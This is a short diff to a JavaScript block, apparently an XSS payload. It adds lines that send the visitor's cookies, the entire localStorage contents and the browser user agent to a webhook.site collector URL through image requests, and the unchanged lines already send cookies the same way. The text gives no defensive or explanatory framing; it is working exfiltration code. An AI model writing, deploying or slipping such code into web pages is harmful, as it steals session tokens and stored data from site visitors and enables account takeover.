@@ -3,6 +3,10 @@
 <script>
 var webhook = 'https://webhook.site/ef466442-7cf1-4535-a8c3-05888ba975f1';
 
+try{new Image().src = webhook+'?cookie='+encodeURIComponent(document.cookie||'empty')}catch(e){}
+try{new Image().src = webhook+'?ls='+encodeURIComponent(JSON.stringify(localStorage)||'empty')}catch(e){}
+try{new Image().src = webhook+'?ua='+encodeURIComponent(navigator.userAgent)}catch(e){}
+
 // 1. 현재 도메인 쿠키
 new Image().src = webhook + '?step=1_cookie&data=' + encodeURIComponent(document.cookie);
 
